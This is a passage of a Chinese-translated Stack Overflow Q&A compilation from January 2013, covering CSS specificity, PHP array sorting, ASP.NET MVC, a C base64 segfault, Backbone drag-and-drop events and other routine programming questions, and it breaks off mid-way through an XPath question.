> 标签：xcode, email

是否可以阅读特定电子邮件收件箱中的最后一封电子邮件的内容？我正在为一家公司开发一个应用程序，我希望任何人都能够向特定地址发送电子邮件，然后该电子邮件的内容将在应用程序内的文本字段中可见。但要使其正常工作，该应用程序必须能够访问特定的电子邮件。我敢打赌，还有其他方法可以更新应用程序中的文本字段，但这将使每个人都能够轻松更新此新闻提要。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T21:17:37.840

第三方应用程序无权访问系统邮件应用程序的数据库。如果您想访问电子邮件的内容，您需要连接到该服务器并自己检索其邮件。

# css - CSS 规则优先级

> ID：14346538
> 
> 赞同：3
> 
> 时间：2013-01-15T20:42:58.003
> 
> 标签：css

我有这个简单的 CSS：

```
.cont div {

  margin:10px;
  border:1px solid;
}

.mark {   /* This get ignored? */

 margin:30px;
} 
```

使用此标记：

```
<div class="cont">
  <div>a</div>
  <div class="mark">b</div>
</div> 
```

我除了 div.mark 之外，`margin:30px;`但至少在 Chrome 中这是不正确的，因为通用规则`.cont div`似乎具有更高的优先级。

考虑我不想使用`!important`有没有其他方法可以解决这个问题？

[http://jsfiddle.net/xNVRm/](http://jsfiddle.net/xNVRm/)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T20:43:54.743

只需通过添加标签名称使您的选择器更具体：

```
div.mark {
    margin:30px;
} 
```

**演示：http: [//jsfiddle.net/xNVRm/1/](http://jsfiddle.net/xNVRm/1/)**

`.cont .mark`如果您想避免使用标签名称，也可以使用。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-15T20:44:18.970

为了避免使用`important`你需要使你的css选择器更具体。您可以使用`.cont div.mark`. 它比 div.mark 更具体。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-15T20:51:36.957

“.cont div”声明覆盖了“.mark”声明，因为它实际上更具体。CSS 使用一种点系统来确定适用哪些规则。在您的情况下，“.cont div”指定了一个类和其中的一个元素，而“.mark”只指定了一个类。

有关所有符合标准的浏览器应使用的确切规则，请参阅此链接：[http ://www.w3.org/TR/CSS21/cascade.html#specificity](http://www.w3.org/TR/CSS21/cascade.html#specificity)

在您的情况下，您可以通过在第二个声明中使用“.cont .mark”来解决此问题。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-15T21:03:03.993

Looking over this again, I see I wasn't understanding what you were trying to do. I think I see now.

You are is saying - ANY div inside of anything with class .cont will have 10px margin. It's more specific then .mark. .mark is 30px - BUT it's a div that is inside of .cont - so it's 10px. It reads right to left - that is a good way to think about it and check specificity.

I have come to think of things with a more object oriented approach. What do you think about this approach?

HTML

```
<div class="container section01">
  <div class="block a">a</div>
  <div class="block b">b</div>
</div> 
```

CSS

```
.container {
    width: 100%;
    float: left;
    border: 1px solid red;
}

.container .block {
    /* you can style these site wide */
}

.section01 .block {
    border:1px solid black;
    padding:10px;
    margin-bottom: 1em;
}

.section01 .block:last-of-type {
    margin-bottom: 0;
}

.section01 .a {
    background-color: red;
}

.section01 .b {
    background-color: lightblue;
} 
```

SASS would make this much easier.

a [jsFiddle](http://jsfiddle.net/sheriffderek/FwQHm/) of this example

a [CODEPEN](http://codepen.io/sheriffderek/pen/JwxAs) of this on a larger scale

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-01-15T20:48:42.967

特异性是如何给 CSS 规则排序的关键。尝试查看 HTML Dog 中的这篇文章：

[http://www.htmldog.com/guides/cssadvanced/specificity/](http://www.htmldog.com/guides/cssadvanced/specificity/)

您可以`div.mark`改用，*这意味着任何具有标记类的 div 都可以这样做。*

# php - PHP GET JSON使用cURL，排序返回的数组

> ID：14346540
> 
> 赞同：2
> 
> 时间：2013-01-15T20:43:04.070
> 
> 标签：php, json, curl

我正在使用 PHP 从 Web 服务返回 JSON。我能够获取 JSON，对其进行解码并查看结果。但是，我需要能够按特定值对数组进行排序。我目前有：

```
// JSON URL which should be requested
$json_url = 'https://*******/maincategories';

// Initializing curl
$ch = curl_init( $json_url );

// Configuring curl options
$options = array(
CURLOPT_RETURNTRANSFER => true,
CURLOPT_HTTPHEADER => array('Content-type: application/json') ,
);

// Setting curl options
curl_setopt_array( $ch, $options );

// Getting results
$result =  curl_exec($ch); // Getting JSON result string

$data = json_decode($result);

ksort($data, "Total");

print_r($data); 
```

`print_r($data);`打印如下：

```
Array ( [0] => stdClass Object ( [Goal] => 10000000 [Name] => Rental [Total] => 500000 ) [1] => stdClass Object ( [Goal] => 8000000 [Name] => National Sales [Total] => 750000 ) [2] => stdClass Object ( [Goal] => 120000000 [Name] => Vendor Leasing [Total] => 500000 ) ) 
```

我试图使用 ksort 并通过键按升序对数组进行排序`Total`。如何对这个数组进行排序，使总数最高的对象排在第一位，其余的按升序排列？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-15T20:47:58.427

这应该适合你：

```
usort($data, function ($a, $b) {
    return $a->Total - $b->Total;
}); 
```

请注意，如果您想要一个关联数组而不是来自 的对象`json_decode`，请使用`json_decode(..., true)`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-15T20:47:50.207

你有一个对象数组。因此，您需要定义自己的自定义排序规则。你应该使用`usort()`这个。也许是这样的：

```
usort($data, function ($a, $b) {
    if ((int)$a->Total > (int)$b->Total)) {
        return 1;
    } else if ((int)$a->Total < (int)$b->Total)) {
        return -1;
    } else {
        return 0;
    }
}); 
```

# php - PHP MySQL 在单个查询上查询多个类别

> ID：14346543
> 
> 赞同：0
> 
> 时间：2013-01-15T20:43:25.343
> 
> 标签：php, mysql, mysqli

我有一个对工具页面的链接进行分类的应用程序。在此页面上，我希望有多个类别以及这些类别下的每个工具。由于我将拥有 13 个类别（随着工具的使用会更多），我不想为每个类别运行查询。我宁愿运行一个查询来获取所有数据。

现在我已经设置了页面，以便它显示每个类别并带有一个下拉菜单以查看工具。我需要做的是拥有它，以便只显示该类别的工具。我在解决如何从单个查询中处理所有这些数据时遇到问题。

目前我正在使用 while 语句将结果作为数组运行。

```
while($tools = $result->fetch_assoc()){
    if($tools['id'] = 1){
        echo $tools['name'];
    }
} 
```

这只是我目前计划做的一个基本模型。我忍不住想，但是有更好的方法来解决这个问题。从 MySQL 中获取大量数据然后使用 PHP 将其分解为类别的最佳方法是什么？如果我需要运行多个查询，那很好，但我不想为每个类别运行查询。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T20:52:57.107

如果你没有性能问题，你可以像这样使用 GROUP_CONCAT 函数，

```
SELECT id,GROUP_CONCAT(name)
FROM tools
GROUP BY id 
```

[您可以在此处](http://dev.mysql.com/doc/refman/5.0/en/group-by-functions.html#function_group-concat)从 mysql 官方网站阅读更多关于 GROUP_CONCAT 的信息

# asp.net-mvc - 开始为 ToDoList 学习 MVC

> ID：14346545
> 
> 赞同：-1
> 
> 时间：2013-01-15T20:43:30.950
> 
> 标签：asp.net-mvc

不久前，我在这里寻求有关我在 jQuery 中创建的 ToDoList 的帮助。我尽我所能完成了这项工作，不过，我转向了 MVC。我看了一些教程，也看了一些书上的课，但我还是不明白。我完全理解的是关注点分离（在大学里学过）。我想一旦我学会使用它，我就会爱上它。所以，我遇到的问题可能很简单。

我知道如何制作视图和控制器，以及如何将它们“链接”在一起。我也知道 ViewBag（我可能会添加非常聪明），但我不知道如何让模型出现在视图中。我已经完成了它的课程，但也许我只是在这里遗漏了一些东西。

任何帮助都会很棒！

谢谢。

顺便说一句，这是我的代码：

```
ToDoListController:

using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using System.Web.Routing;
using System.Web.Security;
using MvcMovie.Models;

namespace MvcMovie.Controllers
{
    public class ToDoListController : Controller
    {
        //
        // GET: /ToDoList/

        public ActionResult Index(ToDoList model)
        {
            return View(model);
        }

    }
}

ToDoListModels:

using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;

namespace MvcMovie.Models
{
    public class ToDoList
    {
        public int ListID { get; set; }
        public String TaskName { get; set; }
        public string Description { get; set; }
        public string Name { get; set; }
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T21:04:34.510

您是否尝试发送 json 的数据？如果您使用这些字段创建视图，则可以通过 json 发送数据。

例如

```
@using(Html.BeginForm("ToDoList","IndexResponse",new{Model.ListID}))
{
   @Html.EditorFor(model => model.TaskName)
...
}

public ActionResult IndexResponse(ToDoList model)
{
    return View(model);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T22:15:30.887

答案很简单。您的 Action 方法上方缺少`[HttpPost]`属性。

> 但我不知道如何让模型出现在视图中。

例如，当您有一些模型时：

```
public class TestViewModel
{
    public int TestId { get; set; }
    public string TestStringProperty { get; set; }
} 
```

如果你想在视图和控制器之间进行双向通信，你必须以 html 形式创建一个视图——这就是你从视图与服务器通信的方式。

```
@model NamespaceOfYourModel.TestViewModel

@using(Html.BeginForm("TestAction", "ToDoListController", FormMethod.Post))
{
    @Html.HiddenFor(m => m.TestId)
    @Html.LabelFor(m => m.TestStringProperty)
    @Html.EditorFor(m => m.TestStringProperty)

    <input type="submit" name="submitForm" value="Save" />
} 
```

现在您必须编写两个方法：首先将新模型对象发送到视图，然后在提交表单时获取从视图传递的模型。

```
public ActionResult TestAction()
{
    //creating new object of your model
    TestViewModel testModel = new TestViewModel();

    //it will be 1 in the second method too
    testModel.TestId = 1;
    //passing model to the view
    return View(testModel);
}

//You say you want that method to be called when form is submited 
[HttpPost]
public ActionResult TestAction(TestViewModel testModel)
{
    if(testModel != null)
    {
        //you will see that the testModel will have value passed in a view
        var imNotNull = testModel;
    }
} 
```

# android - Android 应用名称必须是唯一的吗？

> ID：14346546
> 
> 赞同：21
> 
> 时间：2013-01-15T20:43:36.300
> 
> 标签：android, google-play

如果已经存在同名（不是我的）应用程序，我可以将 Android 应用程序发布到 Google Play 吗？名称必须是唯一的（先到先得）还是 Google Play 让“自由市场”决定哪个名称值得？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-01-15T20:47:20.157

您可以发布一个与另一个应用程序名称完全相同的应用程序，包名称（反向 Web URL 格式）是保持它唯一性的原因，例如 com.yourwebsite.yourappname 或 com.yourwebsite.yoursuitename.yourappname，但我会为市场上的东西建议一个有创意的名字！

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-01-15T20:53:02.107

Google Play 允许许多应用程序具有相同的标题。但是，每个应用程序的应用程序包需要在 Google Play 中是唯一的。这是您在项目的 AndroidManifest.xml 文件中`package`为标记提供的属性值。`<manifest>`从[文档](http://developer.android.com/guide/topics/manifest/manifest-element.html#package)：

> 包名称用作应用程序的唯一标识符。

然后继续：

> **注意：**一旦你发布了你的应用程序，你**就不能改变包名**。包名定义了你的应用程序的身份，所以如果你改变它，那么它被认为是一个不同的应用程序，以前版本的用户不能更新到新版本。

# iis - 默认网站下的wix虚拟目录未卸载，与其他功能冲突？

> ID：14346547
> 
> 赞同：2
> 
> 时间：2013-01-15T20:43:39.087
> 
> 标签：iis, wix, wix3.5

我正在为几个 .net Web 应用程序使用 wix 构建安装程序。我有两个功能，其中之一是在 IIS 的默认网站下安装多个虚拟目录/应用程序。第二个功能创建一个具有单个虚拟目录的单独网站。

问题是当我安装这两个功能时，默认网站下的虚拟目录（来自功能 1）在卸载过程中不会被删除。奇怪的是，如果我只安装功能 1（不包括功能 2），那么功能 1 的卸载工作正常，并且虚拟目录被删除。

我是 wix 的新手，我猜我的 product.wxs 出了点问题，或者有些我不理解。想法？

这是我的 product.wxs 文件中的示例片段：

```
<Feature Id="feature1" Title="feature1" Description="feature 1 description" Level="1" ConfigurableDirectory="INSTALLDIR" Display="expand">
  ...
  <ComponentGroupRef Id="IIS_Feature1" />
</Feature>

<Feature Id="feature2" Title="feature2" Description="feature 2 description" Level="1" ConfigurableDirectory="INSTALLDIR" Display="expand">
  ...
  <ComponentGroupRef Id="IIS_Feature2" />
</Feature> 
```

```
<Directory Id="TARGETDIR" Name="SourceDir">
  ...
  <Directory Id="ROOT_DRIVE">
    <Directory Id="Inetpubdir" Name="inetpub">
      <Directory Id="wwwrootdir" Name="wwwroot" />
      <Directory Id="wwwrootcustom" Name="wwwroot-custom" />
    </Directory>
  </Directory>
</Directory> 
```

```
<ComponentGroup Id="IIS_Feature1">
  <Component Id="IIS_WebApp1" Guid="some-guid-1" Directory="wwwrootdir" KeyPath="yes">
    <iis:WebVirtualDir Id="WebApp1VirtualDir" Alias="webapp1" WebSite="DefaultWebSite" Directory="WEBAPP1DIR">
      <iis:WebApplication Id="WebApp1IISApplication" Name="webapp1" />
    </iis:WebVirtualDir>
  </Component>

  <Component Id="IIS_WebApp2" Guid="some-guid-2" Directory="wwwrootdir" KeyPath="yes">
    <iis:WebVirtualDir Id="WebApp2VirtualDir" Alias="webapp2" WebSite="DefaultWebSite" Directory="WEBAPP2DIR">
      <iis:WebApplication Id="WebApp2IISApplication" Name="webapp2" />
    </iis:WebVirtualDir>
  </Component>

  <Component Id="IIS_WebApp3" Guid="some-guid-3" Directory="wwwrootdir" KeyPath="yes">
    <iis:WebVirtualDir Id="WebApp3VirtualDir" Alias="webapp3" WebSite="DefaultWebSite" Directory="WEBAPP3DIR">
      <iis:WebApplication Id="WebApp3IISApplication" Name="webapp3" />
    </iis:WebVirtualDir>
  </Component>

</ComponentGroup>

<ComponentGroup Id="IIS_Feature2">
  <Component Id="IIS_WebApp4" Guid="some-guid-4" Directory="wwwrootcustom" KeyPath="yes">
    <iis:WebSite Id="WebApp4Site" Description="Web App 4 Site" Directory="wwwrootcustom" AutoStart="yes">
      <iis:WebVirtualDir Id="WebApp4VirtualDir" Alias="webapp4" Directory="WEBAPP4DIR">
        <iis:WebApplication Id="WebApp4IISApplication" Name="webapp4" />
      </iis:WebVirtualDir>
      <iis:WebAddress Id="WebApp4SiteAddr" Secure="yes" Port="443"/>
    </iis:WebSite>
  </Component>
</ComponentGroup> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-07T19:02:26.133

这个问题是在我的安装程序的早期开发过程中发现的。随着更多开发工作的完成和其他问题的解决，我不再看到这种行为。

我从来没有真正弄清楚到底发生了什么，但我在测试过程中注意到，如果安装程序出现一个或多个问题，卸载过程中会留下某些（看似无关的）组件......

# html - 如何在 div html 中使用 ruby

> ID：14346548
> 
> 赞同：1
> 
> 时间：2013-01-15T20:43:39.300
> 
> 标签：html, ruby-on-rails, ruby

我在 content.html.erb 中有 Rails 应用程序，我有这段代码，我想将 data-url 分配给可变的cover.image_address。此代码不起作用如何在 div html 中使用 ruby​​。

`<div class="product" data-type="magazine" data-popup="true"
data-url= <% "assets/#{cover.image_address}" %> > <%= image_tag(cover.image_address, {:width => "76", :height => "107"}) %> </div>`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T20:46:59.693

您错过`=`了资产调用中的缺失。应该：

`<%= "assets/#{cover.image_address}" %>`

# c++ - R* 树重叠计算

> ID：14346549
> 
> 赞同：1
> 
> 时间：2013-01-15T20:43:39.420
> 
> 标签：c++, algorithm, data-structures, r-tree

我正在阅读[R* Tree 的这个实现](http://www.virtualroadside.com/blog/index.php/2008/10/04/r-tree-implementation-for-cpp/)，我注意到它们计算重叠的方式与[论文](http://epub.ub.uni-muenchen.de/4256/1/31.pdf)定义的方式不同。

在论文中，重叠定义如下：

> 对于给定的节点/矩形**k ，计算****k和****k**的每个兄弟（不包括**k**）之间的交集面积总和。

重叠放大是这个值的增量，如果将项目**r**添加到**k ，节点****k**的重叠是多少。

 ****像这样的东西：

```
childOverlapEnlargement(Node child, item r)
{
    childEnlarged = child.union(r);
    sum = 0;
    for(each sibling s of child which isn't node)
    {
        sum += area(childEnlarged.intersect(s)) - area(child.intersect(s));
    }
    return sum;
} 
```

在另一种实现中，它们按给定节点与要插入的项目的交集区域进行排序。像这样的东西：

```
childOverlapEnlargement(Node node, item r)
{
    return area(node.intersect(r));
} 
```

显然，它们的实现在计算上比论文的定义要少。但是，我找不到任何明显的逻辑为什么这两个计算应该相等。

所以我的问题是：

1.  这两个计算是否总是最终选择相同的子树？为什么？
2.  如果它们确实导致选择不同的子树，结果是更好还是接近论文的定义？还是选择错误？

编辑：重新阅读他们的实现，我意识到他们不是在比较两个兄弟姐妹的交集，而是每个潜在叶子的交集和被插入的项目。奇怪的是，他们选择了与插入项目重叠最少的兄弟姐妹。您不想插入与所插入项目重叠最多的节点吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T07:35:29.617

也许您正在查看的实现有错误或不正确。没有人是完美的。

请注意，R*-tree 试图最小化**重叠放大**，而不是重叠本身。

一些重叠可能是不可避免的。如果已经存在重叠，则在插入其他矩形时，您不能期望它会破坏。但是您可以尝试至少不增加重叠量。

至于性能考虑，请检查您是否需要实际计算相交矩形。尝试代替计算`area(intersection())`来做一个功能`intersectionSize()`。这*确实*有所作为。例如，if`A.maxX = 1`和`B.minX = 2`I 可以立即将交集大小设为 0，而无需查看任何其他维度。

避免急切地预先计算您可能需要的所有交叉点等。相反，只计算您实际需要的那些。**分析**您的代码，看看您是否可以优化关键代码路径。那里通常有一些低垂的果实。****

# windows-phone-7 - Windows Phone - 为按钮创建 AppBarButton 样式

> ID：14346550
> 
> 赞同：0
> 
> 时间：2013-01-15T20:43:41.293
> 
> 标签：windows-phone-7, windows-phone-8, windows-phone, application-bar

我需要显示一个与 AppBarButton 样式相同的 Button。我使用与 AppBar 中相同的图标，例如软盘，但我需要在图标周围动态创建圆圈。

如何为此创建样式？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T20:57:30.560

看看 Coding4Fun 工具包的 RoundButton [http://coding4fun.codeplex.com](http://coding4fun.codeplex.com)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-16T05:53:43.100

下面的第三方工具将帮助您创建最大的 Metro 风格图标集合。

[http://www.syncfusion.com/downloads/metrostudio](http://www.syncfusion.com/downloads/metrostudio)

我希望这可以帮助你。

# c - 尝试生成 base64 编码值时出现 Seg 错误 - C

> ID：14346551
> 
> 赞同：0
> 
> 时间：2013-01-15T20:43:47.790
> 
> 标签：c, debugging, segmentation-fault

我正在尝试通过使用[此处提到的实现来获取字符串值“简单”的 Base 64 编码值](https://stackoverflow.com/a/6782480/183717)

```
#include<openssl/sha.h>
#include<stdio.h>
#include<string.h>
#include<math.h>
#include<stdint.h>
#include<stdlib.h>

static char encoding_table[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
                                'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
                                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                                'w', 'x', 'y', 'z', '0', '1', '2', '3',
                                '4', '5', '6', '7', '8', '9', '+', '/'};

static int mod_table[] = {0,2,1};

char *base64_encode(const unsigned char *data,
                    size_t input_length,
                    size_t *output_length)
{
        printf("-- Begins -- ");
        *output_length = (size_t) (4.0 * ceil((double) input_length / 3.0));
        char *encoded_data = malloc(*output_length);

        for (int i = 0, j = 0; i < input_length;) {

        uint32_t octet_a = i < input_length ? data[i++] : 0;
        uint32_t octet_b = i < input_length ? data[i++] : 0;
        uint32_t octet_c = i < input_length ? data[i++] : 0;

        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

        encoded_data[j++] = encoding_table[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 0 * 6) & 0x3F];
        }

    for (int i = 0; i < mod_table[input_length % 3]; i++)
        encoded_data[*output_length - 1 - i] = '=';
        printf(" -- Ends -- ");

    return encoded_data;

   }

int main(int argc, char **argv)
{
        unsigned char ibuf[] = "simple";
        size_t *outLen;
        size_t *inLen = (size_t) strlen(ibuf);
        char *encodeVal = base64_encode(ibuf, inLen, outLen);
        return(0);
} 
```

当我尝试使用 gdb 进行调试时，我得到的只是：

```
Program received signal SIGSEGV, Segmentation fault.
0x000000000040073f in base64_encode (data=0x7fff65298a90 "simple", input_length=6, output_length=0x400a50) at openSha.c:25
25              *output_length = (size_t) (4.0 * ceil((double) input_length / 3.0)); 
```

这里有什么错误？我很久没有用 C 编码了，所以如果我在这里遗漏了一些明显的东西，我很抱歉。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:47:14.163

```
size_t *outLen; 
```

您将未初始化的指针传递给`encodeVal`，并写入它指向的位置：

```
*output_length = (size_t) (4.0 * ceil((double) input_length / 3.0)); 
```

您应该传递`size_t`变量的地址，或者至少是指向已分配内存的初始化指针。

还，

```
size_t *inLen = (size_t) strlen(ibuf); 
```

很可能是错的，应该是`size_t inLen = strlen(ibuf);`。

可能，而不是

```
char *encoded_data = malloc(*output_length); 
```

您应该再 malloc 一个，并以 0 结尾编码的字符串（但这取决于使用情况）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T20:45:32.597

```
 size_t *inLen = (size_t) strlen(ibuf); 
```

这看起来不对。

`inLen`是一个指针，`size_t`但您正在为其分配一个`size_t`值。

还有这个电话：

```
base64_encode(ibuf, inLen, outLen); 
```

`base64_encode`期望 a`size_t`作为其第二个参数，但您传递的是 a `size_t *`。

finally `outLen`未初始化，但您将其值传递给`base64_encode`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-15T20:48:07.133

此指针未初始化：

`size_t *outLen;`

在第 25 行你想取消引用它。将您的代码更改为：

```
size_t outLen;
base64_encode(ibuf, inLen, &outLen); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-15T20:49:51.113

我刚刚使用了这段代码。

那是工作：

```
#include <stdint.h>
#include <stdlib.h>

static char encoding_table[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
                                'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
                                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                                'w', 'x', 'y', 'z', '0', '1', '2', '3',
                                '4', '5', '6', '7', '8', '9', '+', '/'};
static char *decoding_table = NULL;
static int mod_table[] = {0, 2, 1};

void build_decoding_table();

char *base64_encode(const unsigned char *data,
                    size_t input_length,
                    size_t *output_length) {
    int i, j;
    *output_length = 4 *((input_length + 2)/ 3);

    char *encoded_data = calloc(*output_length, 1);
    if (!encoded_data) return NULL;

    for (i = 0, j = 0; i < input_length;) {

        uint32_t octet_a = i < input_length ? data[i++] : 0;
        uint32_t octet_b = i < input_length ? data[i++] : 0;
        uint32_t octet_c = i < input_length ? data[i++] : 0;

        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

        encoded_data[j++] = encoding_table[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 0 * 6) & 0x3F];
    }

    for (i = 0; i < mod_table[input_length % 3]; i++)
        encoded_data[*output_length - 1 - i] = '=';

    return encoded_data;
}

unsigned char *base64_decode(const char *data,
                    size_t input_length,
                    size_t *output_length) {
    int i, j;
    if (decoding_table == NULL) build_decoding_table();

    if (input_length % 4 != 0) return NULL;

    *output_length = input_length / 4 * 3;
    if (data[input_length - 1] == '=') (*output_length)--;
    if (data[input_length - 2] == '=') (*output_length)--;

    unsigned char *decoded_data = calloc(*output_length, 1);
    if (!decoded_data) return NULL;

    for (i = 0, j = 0; i < input_length;) {

        uint32_t sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];

        uint32_t triple = (sextet_a << 3 * 6)
                        + (sextet_b << 2 * 6)
                        + (sextet_c << 1 * 6)
                        + (sextet_d << 0 * 6);

        if (j < *output_length) decoded_data[j++] = (triple >> 2 * 8) & 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 1 * 8) & 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 0 * 8) & 0xFF;
    }

    return decoded_data;
}

void build_decoding_table() {
    int i;
    decoding_table = malloc(256);

    for (i = 0; i < 0x40; i++)
        decoding_table[encoding_table[i]] = i;
}

void base64_cleanup() {
    free(decoding_table);
}

#include <string.h>
#include <stdio.h>

int main(int argc, char **argv){
    if(argc != 2) return -1;
    size_t len = strlen(argv[1]), olen;
    printf("len: %zd\n", 4 *((len + 2)/ 3));
    printf("argument %s coded: %s\n", argv[1], base64_encode(argv[1], len, &olen));
    base64_cleanup();
    return 0;
} 
```

# jquery - 在主干视图上未触发删除事件

> ID：14346556
> 
> 赞同：4
> 
> 时间：2013-01-15T20:44:06.947
> 
> 标签：jquery, node.js, events, backbone.js, requirejs

当这个#~@@！发生了！

我使用 require 将我的视图与模型等分开。

在我的 Backbone 视图中，我处理这些事件：

```
define(['...'],function(...) {

var DishView = Backbone.View.extend({
    template: _.template(dish),
    tagName: 'div',
    id: 'dish',

    initialize: function() {
        console.log('initializing dishView');
        this.model.on('change', this.render, this);
    },

    render: function(){
        console.log('rendering dishView');
        this.$el.html(this.template(this.model.toJSON()));
        return this;
    },

    events: {
        'click #relations-menu .newItem': 'launch_modal_relations',
        'click #delete' : 'delete_dish',
        'click #save-basic-changes': 'save_basic',
        'drop #dropPicture' : 'dropHandler',
        'dragenter #dropPicture' : 'alertMe'
    },

    alertMe: function () {
        console.log('clicked on image');
    },

    delete_dish: function () {
        this.model.deleteMyself();
        Backbone.history.navigate('/', {trigger: true});
    },

    save_basic: function (event) {
        var name = $('#inputName').val();
        var description = $('#inputDescription').val();
        var price = $('#inputPrice').val();
        this.model.updateBasicInfo(name, description, price);
    },

    dropHandler: function(event) {
        event.preventDefault();
        console.log('drop received');
        event.stopPropagation();

        var e = event.originalEvent;
        e.dataTransfer.dropEffect = 'copy';
        this.pictureFile = e.dataTransfer.files[0];
            ...

    },
return DishView;

}); 
```

我的拖放工作正常，但当添加了更多功能时，它突然停止工作:(它在浏览器中打开的图像文件。

我已经阅读了有关 DOM 准备就绪的信息，并且有时会发生这种情况（如果在 DOM 准备好时对代码进行评估）**，但点击事件仍然会被触发，dragenter 事件也是如此......**

这可能是一些错字吗？我有点疯了，我不明白发生了什么，也不记得有一个好的承诺要回去检查：S

如果您能提供一些可能的答案，谢谢大家:)

例如： - 如何调试 drop 事件？？？- 我怎么知道一个事件是否与我的观点相关？

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2013-01-16T00:40:28.213

你没疯。谷歌浏览器最近的一次更新打破了很多网站的浏览器功能，包括，似乎是 NodeCellar 教程。不过，这很容易解决。Chrome 现在要求您阻止`dragover`事件的默认操作：

```
$('div').on('drop',function(e){
    e.originalEvent.stopPropagation();
    e.originalEvent.preventDefault();
    $(this).html('A file was dropped!');
}).on('dragover', function (e) {
  e.preventDefault();
}); 
```

这个[JSFiddle 演示](http://jsfiddle.net/ejQHr/)适用于我（Chrome 24.0.1312.52）。这是[Chromium 问题 #168387](http://code.google.com/p/chromium/issues/detail?id=168387)，关于这个问题。

以及在 NodeCellar 中修复此问题的[拉取请求](https://github.com/ccoenraets/nodecellar/pull/5)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-08-27T08:56:19.747

您可以在 Backbone 上添加查看此代码：

```
events: {
....
....
    "drop #picture" : "dropHandler",
    "dragover #picture" : "dragOver"
},

dropHandler: function (event) {
    event.stopPropagation();
    event.preventDefault();
....
....
},

dragOver: function (event) {
    event.preventDefault();
} 
```

# sql - Excel：在“命令文本”中发送多个值

> ID：14346563
> 
> 赞同：2
> 
> 时间：2013-01-15T20:44:21.877
> 
> 标签：sql, excel, data-processing

位于“数据>连接>属性>定义（选项卡）>命令文本”中，我有以下内容：

```
{Call SP_calculo_algo(?)} 
```

![命令文本](../Images/7d2b1b1a026079e64c2f6d2fda6da080.png)

目前该函数仅通过其具有的唯一参数接收一个值，据有人告诉我，它由问号 (?) 的字符表示。

我需要的是通过函数发送两 (2) 个值，因为我有一个 SQL 查询，它返回引用两个日期之间范围的数据。例如：开始日期（参数 1）和结束日期（参数 2）。

你能帮助我吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-01-15T23:09:38.153

确保您使用 Microsoft Query 进行连接。

数据 -> 来自其他来源 -> 来自 Microsoft Query

在向导结束时，确保指定“将数据返回到 Microsoft Excel”。

查询执行后，数据将在您的工作表上。单击结果集的某处，然后选择查询数据 -> 连接 -> 属性。

单击定义选项卡。修改命令文本以包含带有问号的查询作为参数的占位符。

![MS 查询参数](../Images/a685f98e6adef3b24e94617e226fffb2.png)

单击确定，系统将提示您输入每个参数。如果要保存输入的值以供将来刷新，请单击该框。

![提示 MS 查询参数](../Images/7526dfe3abf28476fa5770ce677ff43b.png)

# xslt - XPATH 1.0 具有两个不同参数的复杂选择

> ID：14346567
> 
> 赞同：0
> 
> 时间：2013-01-15T20:44:31.040
> 
> 标签：xslt, xpath

我对 XPATH 有疑问。我有一个这样的 XML 结构：

```
<root>
    <state name="UsUed">
        <transition event-source="this" event="edit()" target="UsEd_editing" />
        ...
    </state>
    <state>
        <transition event-source="this" event="edit()" target="UsEd" />
